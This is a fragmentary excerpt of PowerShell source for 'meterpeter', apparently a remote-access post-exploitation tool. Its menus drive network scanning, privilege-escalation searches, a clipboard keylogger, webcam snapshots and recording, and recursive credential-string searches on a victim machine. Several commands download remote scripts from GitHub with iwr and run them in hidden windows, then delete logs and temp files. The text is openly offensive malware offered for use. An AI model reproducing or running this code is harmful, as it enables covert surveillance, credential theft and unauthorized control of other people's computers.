...
#   PS cmdlet sub version: v2.10.13.3
...
$EndBanner = @"
 ...
 Author: @ZHacker13 &('r00t-3xp10it') - SSA_redteam @2022 V${CmdLetVersion}
"@;
...
$StartBanner = @"
 ...
 written in pure powershell release to windows (python3 required)
 ...
 in 'BXOR' using a secret key and also create one dropper file that
  ...
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "NetScanner")
    {
      ...
      If($choise -ieq "TCPinfo" -or $choise -ieq "TCP")
      {
         ...
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:NetScanner:Tcp> " -NoNewline -ForeGroundColor Green;
      ...
      If($choise -ieq "PingScan" -or $choise -ieq "Ping")
      {
         ...
         write-host "   more 7 minuts to scan one single ip for open_ports\hostnames." -ForegroundColor Yellow;
         write-host "`n`n   Modules   Description                            Privileges Required" -ForegroundColor green;
         write-host "   -------   -----------                            ------------------";
         write-host "   Enum      List active ip addresses on local Lan  UserLand";
         write-host "   PortScan  Lan mass port scanner\domain resolver  UserLand";
         write-host "   AddrScan  Single ip port scanner \ dns resolver  UserLand";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         ...
         If($ping_choise -ieq "AddrScan")
         {
            ...
            $Outputs = Read-Host;
            If($Outputs -eq $null -or $Outputs -iMatch '^(n|no)$')
            {
               $Outputs = "table"
               Write-Host "   => Set: module outputs to format-table .." -ForegroundColor Yellow
            }
            Else
            {
               $Outputs = "verbose"
               Write-Host "   => Set: module outputs to verbose mode .." -ForegroundColor Yellow
            }
    ...
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ...
      If($choise -ieq "Recent" -or $choise -ieq "rece")
      {
         ...
         $Command = "Get-ChildItem `$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent|Select-Object Length,Name,LastWriteTime,Attributes|Format-Table -AutoSize|Out-File startup.txt;Get-content startup.txt;Remove-Item startup.txt -Force"
      }
      ...
      {
         write-host " * Listing remote StartUp entrys (regedit)." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host ""
    ...
    If($Command -ieq "keylogger")
    {
        ...
        write-host "   Clipboard Capture clipboard entrys     Start record remote clipboard"
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:keylogger> " -NoNewline -ForeGroundColor Green;
        $choise = Read-Host;
        If($choise -ieq "clip")
        {
           Write-Host " - Start or Stop clipboard keyloger? (start|stop): " -NoNewline
           $Exechoise = Read-Host
           If($Exechoise -iMatch '^(stop)$')
           {
              write-host ""
              $Command = "If(Test-Path -Path `"`$Env:TMP\ClipBoardLogger.log`"){`$KeyPPID = (Get-Content -Path `"`$Env:TMP\ClipBoardLogger.log`"|findstr /C:`"PID       :`") -replace 'PID       : ','';If(`$KeyPPID){echo `"* Stoping Process ID: `$KeyPPID`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Stop-Process -Id `"`$KeyPPID`" -Force;Get-Content -Path `"`$Env:TMP\ClipBoardLogger.log`" -Force;Remove-Item -Path `"`$Env:TMP\ClipBoardLogger.log`" -Force;Remove-Item -Path `"`$Env:TMP\ClipLogger.ps1`" -Force}Else{echo `"   => Error: fail to find keyloger process PID`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Get-Content -Path `"`$Env:TMP\ClipBoardLogger.log`" -Force;Remove-Item -Path `"`$Env:TMP\ClipBoardLogger.log`" -Force;Remove-Item -Path `"`$Env:TMP\ClipLogger.ps1`" -Force}}Else{echo `"   => NotFound: `$Env:TMP\ClipBoardLogger.log`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Remove-Item -Path `"`$Env:TMP\ClipLogger.ps1`" -Force}"
           }
           Else
           {
              $StarTimer = (Get-Date -Format 'hh:mm:ss')
              Write-Host " - Append duplicated entrys to logfile? (yes|no) : " -NoNewline
              $dontfilter = Read-Host
              write-host ""
              If($dontfilter -iMatch '^(y|yes)$')
              {
                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/ClipLogger.ps1`" -OutFile `"`$Env:TMP\ClipLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\ClipLogger.ps1 -dontfilter`";echo `"   Clipboard keylogger started at: $StarTimer...`";echo `"   Logfile: $Env:TMP\ClipBoardLogger.log`""
              }
              Else
              {
                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/ClipLogger.ps1`" -OutFile `"`$Env:TMP\ClipLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\ClipLogger.ps1`";echo `"   Clipboard keylogger started at: $StarTimer...`";echo `"   Logfile: $Env:TMP\ClipBoardLogger.log`""
              }
           }
        }
        If($choise -ieq "Mouse")
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      If($choise -ieq "HiddenDir" -or $choise -ieq "Hidden")
      {
         ...
         If($Vault_choise -ieq "Super")
         {
            ...
            Write-Host " * Query for super hidden folders" -ForegroundColor Green
      ...
      If($choise -ieq "FindEop" -or $choise -ieq "EOP")
      {
        ...
        write-host "   WeakDir   Search weak permissions recursive UserLand";
        write-host "   Service   Search for Unquoted Service Paths UserLand";
        write-host "   RottenP   Search For rotten potato vuln     UserLand";
        write-host "   RegACL    Insecure Registry Permissions     UserLand";
        write-host "   Agressive Search for EOP possible entrys    UserLand";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        ...
        If($my_choise -ieq "Agressive")
        {
           ...
           {
              Write-Host "   => Remark: Module takes aprox 8 minuts to finish .." -ForegroundColor Yellow;write-host "`n`n";
...
"@;Write-Host $AnwsomeBanner
      ...
      If($choise -ieq "Camera" -or $choise -ieq "cam")
      {
        ...
        write-host "`n`n   Modules    Description                 Privileges Required" -ForegroundColor green;
        write-host "   -------    -----------                 ------------------";
        write-host "   Device     List Camera Devices         UserLand";
        write-host "   SnapShot   Auto use of default WebCam  UserLand";
        write-host "   WebCamAvi  Live stream using WebCam    UserLand";
        write-host "   Return     Return to Server Main Menu" -ForeGroundColor yellow;
        ...
        If($Cam_choise -ieq "SnapShot")
        {
           ...
           write-host "`n`n   State    FileName" -ForeGroundColor Green;
           write-host "   -----    --------"
           Write-Host "   running  " -ForegroundColor Red -NoNewline
           Write-Host "%TMP%\image.bmp`n"
        ...
        If($Cam_choise -ieq "WebCamAvi")
        {
           ...
           If([int]$RecTime -lt 10 -or [int]$RecTime -gt 60)
           {
              [int]$RecTime = "15"
           ...
           write-host "  -----      ---------       ----------"
           write-host "  running    " -ForegroundColor Red -NoNewline
           write-host "meterpeter.avi  ${RecTime} (sec)"

           #Execute command remote
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1`" -OutFile `"`$Env:TMP\Invoke-webcamAvi.ps1`";powershell -File `"`$Env:TMP\Invoke-webcamAvi.ps1`" -RecTime `"$RecTime`" -WorkingDir `"`$Env:TMP`";Remove-Item -Path `"`$Env:TMP\Invoke-webcamAvi.ps1`" -Force";
        }
      ...
      {
        write-host "`n`n   Description:" -ForegroundColor Yellow;
        write-host "   This module searchs for credential strings inside"
        write-host "   all files starting in the input directory recursive"
        write-host "   Hint: Leave input fields black to use default settings." -ForegroundColor DarkYellow
        write-host "`n   Fast scan examples" -ForegroundColor Yellow
        write-host "   - Use 'Stop searching after' input to reduce scan time."
        write-host "`n   Modules   Description                   Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                   ------------------";
        write-host "   Start     Search for creds inide files  UserLand";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        ...
        If($pass_choise -ieq "Start")
        {
          ...
          write-host " - The string to capture max length in chars (22)  : " -NoNewLine
          $MaxLength = Read-Host
          If(-not($MaxLength))
          {
             $MaxLength = "22"
             write-host "   => Error: wrong input, using string max lenght: 22" -ForegroundColor Red
          }
          ...
          {
             $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Find-Strings.ps1`" -OutFile `"`$Env:TMP\Find-Strings.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Find-Strings.ps1`" -Path `"$Recursive_search`" -String `"$String`" -strlength `"$MaxLength`" -StopAt `"$StopAt`";Remove-Item -Path `"`$Env:TMP\Find-Strings.ps1`" -Force";
          }
          Else
          {
             $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Find-Strings.ps1`" -OutFile `"`$Env:TMP\Find-Strings.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Find-Strings.ps1`" -Path `"$Recursive_search`" -String `"$String`" -strlength `"$MaxLength`" -StopAt `"$StopAt`" -verb -limmit `"1`";Remove-Item -Path `"`$Env:TMP\Find-Strings.ps1`" -Force";
          }
        }
